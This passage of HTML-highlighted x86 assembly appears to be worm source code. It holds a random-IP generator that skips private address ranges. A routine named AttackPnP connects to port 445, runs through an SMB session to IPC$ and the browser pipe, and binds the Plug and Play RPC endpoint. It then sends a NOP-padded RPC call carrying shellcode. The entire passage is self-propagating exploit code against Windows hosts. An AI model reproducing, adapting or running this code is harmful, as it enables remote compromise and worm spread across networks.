    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">.rnd</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">127</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">.rnd</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">223</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">.rnd</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">172</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.b</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">.b</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">.rnd</span><span class="sc0">
</span><span class="sc5">.b</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">192</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">.next</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">168</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">.rnd</span><span class="sc0">

</span><span class="sc5">.next</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">.rnd</span><span class="sc0">
    
    </span><span class="sc6">ret</span><span class="sc0">
    


</span><span class="sc1">;ARG1:  ip address</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@AttackPnP</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8196</span><span class="sc0">

</span><span class="sc5">_recvbuf</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">4100</span><span class="sc0">    </span><span class="sc1">;[ebp - 4100]</span><span class="sc0">
</span><span class="sc5">_recvbuf_LEN</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">4096</span><span class="sc0">
</span><span class="sc5">_packet</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">8196</span><span class="sc0">    </span><span class="sc1">;[ebp - 8196]</span><span class="sc0">
</span><span class="sc5">_packet_LEN</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">4096</span><span class="sc0">



    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@WaitMaxThreads</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@AddThreadNum</span><span class="sc0">  </span><span class="sc1">;inc THREADNUM</span><span class="sc0">
</span><span class="sc1">;int3</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;IP address</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc4">|</span><span class="sc0"> </span><span class="sc4">((((</span><span class="sc2">445</span><span class="sc0"> </span><span class="sc4">&lt;&lt;</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)&amp;</span><span class="sc2">0xFF00</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">|</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc2">445</span><span class="sc0"> </span><span class="sc4">&gt;&gt;</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)&amp;</span><span class="sc2">0xFF</span><span class="sc4">))</span><span class="sc0"> </span><span class="sc4">&lt;&lt;</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">)</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">socket</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0x10</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">connect</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0"> </span><span class="sc5">.cs</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SMB_Negotiate_LEN</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SMB_Negotiate</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0"> </span><span class="sc5">.cs</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_recvbuf</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SMB_RECV_TIMEOUT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_recvbuf_LEN</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@arecv</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc6">jle</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0"> </span><span class="sc5">.cs</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0"> </span><span class="sc5">.cs</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SMB_SessionSetupAndX_LEN</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SMB_SessionSetupAndX</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0"> </span><span class="sc5">.cs</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SMB_RECV_TIMEOUT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_recvbuf_LEN</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@arecv</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc6">jle</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0"> </span><span class="sc5">.cs</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SMB_SessionSetupAndX2_LEN</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SMB_SessionSetupAndX2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0"> </span><span class="sc5">.cs</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SMB_RECV_TIMEOUT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_recvbuf_LEN</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@arecv</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc6">jle</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0"> </span><span class="sc5">.cs</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0"> </span><span class="sc5">.cs</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">    </span><span class="sc1">;sock</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc5">SMB_TreeConnectAndX_LEN</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_packet</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_recvbuf</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SMB_TreeConnectAndX</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SMB_TreeConnectAndX_LEN</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">memcpy</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;IP</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">inet_ntoa</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">STR_IPC</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">wsprintf</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@convert_name</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">
    </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">     </span><span class="sc1">;edi = _recvbuf</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
    </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xFFFF</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SMB_TreeConnectAndX__LEN</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_packet</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SMB_TreeConnectAndX_LEN</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SMB_TreeConnectAndX_</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SMB_TreeConnectAndX_</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">     </span><span class="sc1">;sock</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_packet</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_packet</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_packet</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0"> </span><span class="sc5">.cs</span><span class="sc0">


    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_recvbuf</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SMB_RECV_TIMEOUT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_recvbuf_LEN</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@arecv</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc6">jle</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0"> </span><span class="sc5">.cs</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0"> </span><span class="sc5">.cs</span><span class="sc0">
        
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SMB_PipeRequest_browser_LEN</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SMB_PipeRequest_browser</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0"> </span><span class="sc5">.cs</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SMB_RECV_TIMEOUT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_recvbuf_LEN</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@arecv</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc6">jle</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0"> </span><span class="sc5">.cs</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0"> </span><span class="sc5">.cs</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SMB_PNPEndpoint_LEN</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SMB_PNPEndpoint</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0"> </span><span class="sc5">.cs</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SMB_RECV_TIMEOUT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_recvbuf_LEN</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@arecv</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
    </span><span class="sc6">jle</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0"> </span><span class="sc5">.cs</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0"> </span><span class="sc5">.cs</span><span class="sc0">

</span><span class="sc1">;int3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x90909090</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">_packet_LEN</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_packet</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">RPC_call_LEN</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">RPC_call</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">memcpy</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_packet</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RPC_call_LEN</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">shellcode_LEN</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">shellcode</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">memcpy</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">RPC_call_end_LEN</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">RPC_call_end</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">_packet</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2196</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">RPC_call_end_LEN</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">memcpy</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">36</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;send</span><span class="sc0">
